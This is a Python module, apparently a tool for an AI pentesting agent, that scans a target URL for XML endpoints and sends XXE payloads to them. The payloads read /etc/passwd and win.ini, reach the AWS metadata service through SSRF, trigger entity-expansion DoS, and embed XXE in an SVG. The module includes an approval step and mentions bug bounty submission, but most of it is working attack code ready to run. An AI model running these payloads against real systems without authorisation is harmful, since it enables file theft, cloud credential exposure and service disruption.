import requests
from langchain.tools import tool
from cancellation import check_cancelled
from checkpoint import require_approval
from custom_tools import exec_logger
from rate_limiter import rate_limiter

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass


def _domain_of(url: str) -> str:
    try:
        from urllib.parse import urlparse
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url


# XXE Payloads
XXE_PAYLOADS = [
    # Classic file read /etc/passwd
    (
        """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>""",
        ["root:x:0:", "bin:x:1:", "daemon:x:2:"],
        "Classic XXE — /etc/passwd read",
        "Critical"
    ),
    # Windows file read
    (
        """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root><data>&xxe;</data></root>""",
        ["[fonts]", "[extensions]", "for 16-bit"],
        "Classic XXE — Windows win.ini read",
        "Critical"
    ),
    # SSRF via XXE
    (
        """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>""",
        ["ami-id", "instance-id", "local-ipv4"],
        "XXE → SSRF AWS Metadata",
        "Critical"
    ),
    # Billion laughs (DoS) — versi ringan
    (
        """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>""",
        [],  # Cek dari response time / error
        "Billion Laughs (DoS)",
        "High"
    ),
    # XXE via SVG upload (common di image upload)
    (
        """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>""",
        ["root:x:0:", "bin:x:1:"],
        "XXE via SVG",
        "Critical"
    ),
]


def _find_xml_endpoints(base_url: str) -> list:
    """Cari endpoint yang mungkin nerima XML."""
    xml_paths = [
        "/api/xml", "/xml", "/upload", "/import",
        "/api/import", "/api/upload", "/api/v1/xml",
        "/api/v1/import", "/webhook", "/api/webhook",
        "/feed", "/rss", "/atom", "/sitemap.xml",
        "/api/soap", "/ws", "/wsdl",
    ]

    found = []
    for path in xml_paths:
        try:
            rate_limiter.wait(_domain_of(base_url))
            url = f"{base_url.rstrip('/')}{path}"
            resp = requests.get(url, timeout=5, verify=False)

            # 200, 400, 405 = endpoint exist
            if resp.status_code in (200, 400, 405, 415):
                content_type = resp.headers.get("Content-Type", "").lower()
                # Prioritasin yang return XML atau JSON (API endpoint)
                if any(ct in content_type for ct in ["xml", "json", "text"]):
                    found.append(url)

        except Exception:
            pass

    return found


def _test_xxe_on_endpoint(url: str) -> list:
    """Test XXE pada satu endpoint."""
    findings = []
    domain = _domain_of(url)

    xml_headers = {
        "Content-Type": "application/xml",
        "User-Agent": "Mozilla/5.0",
    }

    for payload, indicators, payload_name, severity in XXE_PAYLOADS:
        if check_cancelled(exec_logger):
            break

        try:
            rate_limiter.wait(domain)

            resp = requests.post(
                url,
                data=payload,
                headers=xml_headers,
                timeout=8,
                verify=False,
            )

            response_text = resp.text

            # Cek indicators di response
            if indicators:
                if any(indicator in response_text for indicator in indicators):
                    findings.append({
                        "endpoint": url,
                        "payload_name": payload_name,
                        "severity": severity,
                        "detail": f"XXE confirmed — server memproses external entity dan return file contents",
                        "evidence": next(
                            (ind for ind in indicators if ind in response_text), ""
                        )
                    })
                    exec_logger.add_log("XXE Tester", "WARNING", f"XXE found: {payload_name} on {url}")
                    break

            # Buat Billion Laughs — cek dari error atau timeout
            elif "Billion Laughs" in payload_name:
                if resp.status_code in (500, 503) or "memory" in response_text.lower():
                    findings.append({
                        "endpoint": url,
                        "payload_name": payload_name,
                        "severity": severity,
                        "detail": "Server vulnerable terhadap XML Billion Laughs DoS attack",
                        "evidence": f"Status: {resp.status_code}"
                    })

        except requests.Timeout:
            # Timeout juga bisa indikasi Billion Laughs berhasil
            if "Billion Laughs" in payload_name:
                findings.append({
                    "endpoint": url,
                    "payload_name": payload_name,
                    "severity": "High",
                    "detail": "Possible Billion Laughs DoS — server timeout saat proses XML entity expansion",
                    "evidence": "Request timeout"
                })
        except Exception:
            continue

    return findings


@tool("xxe_tester")
def xxe_tester(target_url: str) -> str:
    """
    Menguji XML External Entity (XXE) injection pada target.
    XXE bisa berujung ke file read, SSRF, atau DoS — termasuk
    vulnerability critical di bug bounty.
    
    Args:
        target_url: Base URL target (contoh: https://target.com)
    """
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"XXE injection testing pada {target_url}",
        context="Kirim XML payload dengan external entity ke endpoint yang nerima XML input",
        risk="medium",
        exec_logger=exec_logger,
    )
    if not approved:
        return "TEST DIBATALKAN: human-in-the-loop approval ditolak atau timeout."

    exec_logger.add_log("XXE Tester", "START", f"Memulai XXE testing pada {target_url}")

    # Step 1: Find XML endpoints
    exec_logger.add_log("XXE Tester", "PROCESSING", "Mencari XML-accepting endpoints")
    xml_endpoints = _find_xml_endpoints(target_url)

    # Selalu test base URL juga
    if target_url not in xml_endpoints:
        xml_endpoints.insert(0, target_url)

    exec_logger.add_log("XXE Tester", "SUCCESS", f"Testing {len(xml_endpoints)} endpoints")

    all_findings = []

    for endpoint in xml_endpoints:
        if check_cancelled(exec_logger):
            break

        exec_logger.add_log("XXE Tester", "PROCESSING", f"Testing: {endpoint}")
        findings = _test_xxe_on_endpoint(endpoint)
        all_findings.extend(findings)

    exec_logger.add_log("XXE Tester", "SUCCESS", f"XXE testing selesai. Findings: {len(all_findings)}")

    output = f"=== XXE INJECTION TEST RESULTS FOR {target_url} ===\n\n"
    output += f"Endpoints tested: {len(xml_endpoints)}\n"
    output += f"Endpoints: {', '.join(xml_endpoints[:5])}\n\n"

    if not all_findings:
        output += "[✅] Tidak ditemukan XXE vulnerability. Server tidak memproses external XML entities.\n"
        return output

    critical = [f for f in all_findings if f["severity"] == "Critical"]
    high = [f for f in all_findings if f["severity"] == "High"]

    if critical:
        output += f"[🔴 CRITICAL] {len(critical)} XXE finding(s)\n\n"
        for f in critical:
            output += f"  ▸ Endpoint   : {f['endpoint']}\n"
            output += f"    Type       : {f['payload_name']}\n"
            output += f"    Detail     : {f['detail']}\n"
            output += f"    Evidence   : {f['evidence']}\n\n"

    if high:
        output += f"[🟠 HIGH] {len(high)} finding(s)\n\n"
        for f in high:
            output += f"  ▸ Endpoint   : {f['endpoint']}\n"
            output += f"    Type       : {f['payload_name']}\n"
            output += f"    Detail     : {f['detail']}\n"
            output += f"    Evidence   : {f['evidence']}\n\n"

    output += "⚠️  XXE confirmed — lakukan manual verification sebelum submit ke H1.\n"

    return output